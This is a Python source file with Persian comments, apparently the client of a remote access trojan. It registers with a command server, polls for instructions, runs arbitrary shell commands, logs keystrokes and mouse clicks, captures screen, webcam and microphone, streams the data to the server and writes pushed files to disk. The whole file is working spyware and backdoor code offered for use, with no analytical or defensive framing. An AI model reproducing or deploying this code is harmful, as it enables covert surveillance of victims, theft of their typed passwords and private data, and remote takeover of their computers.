import os
import sys
import time
import json
import uuid
import base64
import socket
import getpass
import platform
import subprocess
import threading
import sqlite3
import tempfile
import pynput
from pynput import keyboard, mouse
from datetime import datetime
import requests
import psutil
import cv2
import numpy as np
import pyaudio
import wave
from typing import Optional, Dict, List

# تنظیمات اولیه
DEBUG = True
API_URL = "http://127.0.0.1:8000/api/"
HEARTBEAT_INTERVAL = 10  # ثانیه
COMMAND_CHECK_INTERVAL = 2  # ثانیه
TIMEOUT = 10

class KeyLogger:
    def __init__(self):
        self.log = ""
        self.listener: Optional[keyboard.Listener] = None
        self.mouse_listener: Optional[mouse.Listener] = None
        self.is_running = False
        self._lock = threading.Lock()
        self.db_path = os.path.join(tempfile.gettempdir(), f"keylogger_{uuid.uuid4().hex}.db")
        self._setup_database()

    def _setup_database(self):
        """ایجاد دیتابیس برای ذخیره لاگ‌ها"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS keystrokes (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT NOT NULL,
                key_type TEXT NOT NULL,
                key_value TEXT NOT NULL,
                window TEXT
            )
        ''')
        conn.commit()
        conn.close()

    def on_press(self, key):
        """هندلر فشار دادن کلید"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")
        try:
            key_char = key.char
            key_type = "char"
        except AttributeError:
            if key == keyboard.Key.space:
                key_char = " "
                key_type = "char"
            elif key == keyboard.Key.enter:
                key_char = "\n"
                key_type = "char"
            else:
                key_char = str(key)
                key_type = "special"
                
        # ذخیره در دیتابیس
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO keystrokes (timestamp, key_type, key_value) VALUES (?, ?, ?)",
            (timestamp, key_type, key_char)
        )
        conn.commit()
        conn.close()
        
        # همچنین در حافظه موقت هم ذخیره شود
        with self._lock:
            self.log += key_char

    def on_click(self, x, y, button, pressed):
        """هندلر کلیک ماوس"""
        if pressed:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            cursor.execute(
                "INSERT INTO keystrokes (timestamp, key_type, key_value) VALUES (?, ?, ?)",
                (timestamp, "mouse", str(button))
            )
            conn.commit()
            conn.close()

    def start(self):
        """شروع کیلاگر"""
        with self._lock:
            if not self.is_running:
                self.is_running = True
                self.listener = keyboard.Listener(on_press=self.on_press)
                self.mouse_listener = mouse.Listener(on_click=self.on_click)
                self.listener.start()
                self.mouse_listener.start()
                self._log("Keylogger started")

    def stop(self) -> str:
        """توقف کیلاگر و بازگرداندن لاگ‌ها"""
        with self._lock:
            if self.is_running:
                self.listener.stop()
                self.mouse_listener.stop()
                self.is_running = False
                
                # خواندن تمام لاگ‌ها از دیتابیس
                conn = sqlite3.connect(self.db_path)
                cursor = conn.cursor()
                cursor.execute("SELECT timestamp, key_type, key_value FROM keystrokes ORDER BY timestamp")
                logs = cursor.fetchall()
                conn.close()
                
                # فرمت کردن لاگ‌ها
                formatted_logs = ""
                for log in logs:
                    timestamp, key_type, key_value = log
                    if key_type == "char":
                        formatted_logs += key_value
                    elif key_type == "special":
                        formatted_logs += f" [{key_value}] "
                    elif key_type == "mouse":
                        formatted_logs += f" [Mouse: {key_value}] "
                
                # حذف فایل دیتابیس
                try:
                    os.remove(self.db_path)
                except:
                    pass
                    
                self._log("Keylogger stopped")
                return formatted_logs
            return ""

    def get_logs(self) -> str:
        """دریافت لاگ‌ها بدون توقف کیلاگر"""
        with self._lock:
            if self.is_running:
                conn = sqlite3.connect(self.db_path)
                cursor = conn.cursor()
                cursor.execute("SELECT timestamp, key_type, key_value FROM keystrokes ORDER BY timestamp")
                logs = cursor.fetchall()
                conn.close()
                
                formatted_logs = ""
                for log in logs:
                    timestamp, key_type, key_value = log
                    if key_type == "char":
                        formatted_logs += key_value
                    elif key_type == "special":
                        formatted_logs += f" [{key_value}] "
                    elif key_type == "mouse":
                        formatted_logs += f" [Mouse: {key_value}] "
                
                return formatted_logs
            return self.log

    def _log(self, message: str):
        if DEBUG:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            print(f"[{timestamp}] {message}")

class DeviceManager:
    def __init__(self):
        self.device_id = self._generate_device_id()
        self.token = str(uuid.uuid4())
        self.keylogger = KeyLogger()
        self.current_path = os.getcwd()
        self.is_streaming = False
        self.stream_type: Optional[str] = None
        self.session = self._setup_session()
        self._log(f"Device initialized - ID: {self.device_id}")

    def _log(self, message: str):
        if DEBUG:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            print(f"[{timestamp}] {message}")

    def _setup_session(self) -> requests.Session:
        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'Content-Type': 'application/json',
            'X-Client-ID': self.device_id,
            'X-Auth-Token': self.token,
            'X-CSRFToken': ''  # برای اطمینان
        })
        return session

    def _generate_device_id(self) -> str:
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2*6, 8)][::-1])
        return f"{getpass.getuser()}-{socket.gethostname()}-{mac}"

    def get_system_info(self) -> Dict:
        try:
            info = {
                "user": getpass.getuser(),
                "os": platform.system(),
                "os_version": platform.version(),
                "path": self.current_path,
                "platform": sys.platform,
                "hostname": socket.gethostname(),
                "ip_address": socket.gethostbyname(socket.gethostname())
            }
            try:
                info["cpu_usage"] = f"{psutil.cpu_percent(interval=1):.1f}%" if hasattr(psutil, 'cpu_percent') else "N/A"
            except Exception as e:
                info["cpu_usage"] = "N/A"
                self._log(f"CPU usage error: {str(e)}")

            try:
                memory = psutil.virtual_memory() if hasattr(psutil, 'virtual_memory') else None
                info["ram_usage"] = f"{memory.percent:.1f}%" if memory else "N/A"
            except Exception as e:
                info["ram_usage"] = "N/A"
                self._log(f"RAM usage error: {str(e)}")

            try:
                disk = psutil.disk_usage('/') if hasattr(psutil, 'disk_usage') else None
                info["disk_usage"] = f"{disk.percent:.1f}%" if disk else "N/A"
            except Exception as e:
                info["disk_usage"] = "N/A"
                self._log(f"Disk usage error: {str(e)}")

            try:
                boot_time = psutil.boot_time() if hasattr(psutil, 'boot_time') else 0
                info["boot_time"] = datetime.fromtimestamp(boot_time).strftime('%Y-%m-%d %H:%M:%S') if boot_time else "N/A"
            except Exception as e:
                info["boot_time"] = "N/A"
                self._log(f"Boot time error: {str(e)}")

            return info
        except Exception as e:
            self._log(f"Error getting system info: {str(e)}")
            return {"error": str(e)}

    def execute_command(self, cmd: str) -> str:
        try:
            if cmd.lower().startswith('cd '):
                new_dir = cmd[3:].strip()
                os.chdir(new_dir)
                self.current_path = os.getcwd()
                return f"Directory changed to {self.current_path}"
            elif cmd.lower().startswith('mkdir '):
                dir_name = cmd[6:].strip()
                os.makedirs(dir_name, exist_ok=True)
                return f"Directory {dir_name} created"

            result = subprocess.run(
                cmd,
                shell=True,
                cwd=self.current_path,
                capture_output=True,
                text=True,
                encoding='utf-8',
                timeout=30
            )
            return result.stdout or result.stderr or "Command executed"
        except Exception as e:
            self._log(f"Command execution error: {str(e)}")
            return f"Error: {str(e)}"

    def capture_screen(self) -> Optional[str]:
        try:
            from mss import mss
            self._log("Capturing screen with mss...")
            with mss() as sct:
                monitor = sct.monitors[1]
                screenshot = sct.grab(monitor)
                frame = np.array(screenshot)
                frame = cv2.cvtColor(frame, cv2.COLOR_RGBA2BGR)
                frame = cv2.resize(frame, (1920, 1080))  # کیفیت 1080p
                _, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 80])  # کیفیت بالاتر
                return base64.b64encode(buffer).decode('ascii')
        except ImportError:
            self._log("mss not installed")
            return "Error: mss not installed"
        except Exception as e:
            self._log(f"Screen capture error: {str(e)}")
            return f"Error: {str(e)}"

    def capture_webcam(self) -> Optional[str]:
        try:
            cap = cv2.VideoCapture(0)
            if not cap.isOpened():
                self._log("Webcam not accessible")
                return "Error: Webcam not accessible"
            ret, frame = cap.read()
            cap.release()
            if not ret:
                self._log("No frame from webcam")
                return "Error: No webcam frame"
            frame = cv2.resize(frame, (1920, 1080))  # کیفیت 1080p
            _, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 80])
            return base64.b64encode(buffer).decode('ascii')
        except Exception as e:
            self._log(f"Webcam error: {str(e)}")
            return f"Error: {str(e)}"

    def record_audio(self, duration: int = 5) -> Optional[str]:  # افزایش به 5 ثانیه برای لایوتر شدن
        try:
            audio = pyaudio.PyAudio()
            stream = audio.open(
                format=pyaudio.paInt16,
                channels=1,
                rate=22050,
                input=True,
                frames_per_buffer=1024
            )
            frames = [stream.read(1024, exception_on_overflow=False) for _ in range(int(22050 / 1024 * duration))]
            stream.stop_stream()
            stream.close()
            audio.terminate()

            temp_file = 'temp_audio.wav'
            with wave.open(temp_file, 'wb') as wf:
                wf.setnchannels(1)
                wf.setsampwidth(audio.get_sample_size(pyaudio.paInt16))
                wf.setframerate(22050)
                wf.writeframes(b''.join(frames))

            with open(temp_file, 'rb') as f:
                audio_data = base64.b64encode(f.read()).decode('ascii')
            os.remove(temp_file)
            self._log(f"Audio recorded: {len(audio_data)} bytes")
            return audio_data
        except Exception as e:
            self._log(f"Audio error: {str(e)}")
            return f"Error: {str(e)}"

    def list_files(self) -> str:
        try:
            result = subprocess.run(
                'dir',
                shell=True,
                cwd=self.current_path,
                capture_output=True,
                text=True,
                encoding='utf-8'
            )
            output = result.stdout or result.stderr or "No files found"
            self._log(f"Listed files: {len(output)} chars")
            return output
        except Exception as e:
            self._log(f"List files error: {str(e)}")
            return f"Error: {str(e)}"

    def upload_file(self, path: str, file_name: str, file_data: str) -> str:
        try:
            full_path = os.path.join(path, file_name)
            os.makedirs(path, exist_ok=True)  # ایجاد مسیر اگر وجود نداشت
            with open(full_path, 'wb') as f:
                f.write(base64.b64decode(file_data))
            self._log(f"File uploaded to {full_path}")
            return f"File uploaded successfully to {full_path}"
        except Exception as e:
            self._log(f"Upload error: {str(e)}")
            return f"Error: {str(e)}"

    def register(self) -> bool:
        try:
            response = self.session.post(
                f"{API_URL}register/",
                json={
                    'client_id': self.device_id,
                    'token': self.token,
                    'info': self.get_system_info()
                },
                timeout=TIMEOUT
            )
            response.raise_for_status()
            self._log(f"Registered: {response.status_code}")
            return True
        except Exception as e:
            self._log(f"Register error: {str(e)}")
            return False

    def check_commands(self):
        while True:
            try:
                response = self.session.get(f"{API_URL}command/{self.device_id}/", timeout=TIMEOUT)
                response.raise_for_status()
                commands = response.json()
                if commands:
                    self._log(f"Processing {len(commands)} commands")

                for cmd in commands:
                    command_id = cmd.get('id')
                    command_text = cmd.get('text', '').lower()

                    output = "Unknown command"
                    if command_text == 'webcam':
                        self.is_streaming = True
                        self.stream_type = 'webcam'
                        output = self.capture_webcam()
                    elif command_text == 'weblive':
                        self.is_streaming = True
                        self.stream_type = 'weblive'
                        output = self.capture_screen()
                    elif command_text == 'webmicrophone':
                        self.is_streaming = True
                        self.stream_type = 'webmicrophone'
                        output = self.record_audio()
                    elif command_text == 'stop_stream':
                        self.is_streaming = False
                        self.stream_type = None
                        output = "Stream stopped"
                    elif command_text == 'list_files':
                        output = self.list_files()
                    elif command_text.startswith('upload_file:'):
                        parts = command_text.split(':', 2)
                        if len(parts) == 3:
                            _, path, file_name, file_data = parts[0], parts[1], parts[2].split(':', 1)
                            output = self.upload_file(path, file_name, file_data[1])
                        else:
                            output = "Error: Invalid upload format"
                    elif command_text == 'start_keylogger':
                        self.keylogger.start()
                        output = "Keylogger started"
                    elif command_text == 'stop_keylogger':
                        output = self.keylogger.stop()
                    elif command_text == 'get_keylogs':
                        output = self.keylogger.get_logs()
                    else:
                        output = self.execute_command(cmd.get('text', ''))

                    if output:
                        response = self.session.post(
                            f"{API_URL}poll/{self.device_id}/",
                            json={'output': output, 'command_id': command_id},
                            timeout=TIMEOUT
                        )
                        response.raise_for_status()
                        self._log(f"Sent response for {command_text}: {len(str(output))} chars")

            except Exception as e:
                self._log(f"Command check error: {str(e)}")
            time.sleep(COMMAND_CHECK_INTERVAL)

    def stream_data(self):
        while True:
            if self.is_streaming and self.stream_type:
                try:
                    data = None
                    if self.stream_type == 'webcam':
                        data = self.capture_webcam()
                    elif self.stream_type == 'weblive':
                        data = self.capture_screen()
                    elif self.stream_type == 'webmicrophone':
                        data = self.record_audio()

                    if data and not data.startswith('Error'):
                        response = self.session.post(
                            f"{API_URL}stream/{self.device_id}/{self.stream_type}/",
                            json={'data': data},
                            timeout=TIMEOUT
                        )
                        response.raise_for_status()
                        self._log(f"Streamed {self.stream_type}: {len(data)} bytes")
                    else:
                        self._log(f"Stream failed for {self.stream_type}: {data}")
                except Exception as e:
                    self._log(f"Stream error: {str(e)}")
            time.sleep(1)  # کاهش برای لایوتر شدن

    def heartbeat(self):
        while True:
            try:
                response = self.session.post(f"{API_URL}register/", json={'client_id': self.device_id, 'token': self.token, 'info': self.get_system_info()}, timeout=TIMEOUT)
                response.raise_for_status()
                self._log("Heartbeat OK")
            except Exception as e:
                self._log(f"Heartbeat error: {str(e)}")
            time.sleep(HEARTBEAT_INTERVAL)

    def run(self):
        self._log("Starting client...")
        if not self.register():
            self._log("Registration failed, retrying...")
            time.sleep(5)
            self.register()

        threading.Thread(target=self.check_commands, daemon=True).start()
        threading.Thread(target=self.heartbeat, daemon=True).start()
        threading.Thread(target=self.stream_data, daemon=True).start()

        self._log("Client running. Press Ctrl+C to stop.")
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            self._log("Shutting down...")

if __name__ == "__main__":
    try:
        device = DeviceManager()
        device.run()
    except Exception as e:
        print(f"Fatal error: {str(e)}")
        sys.exit(1)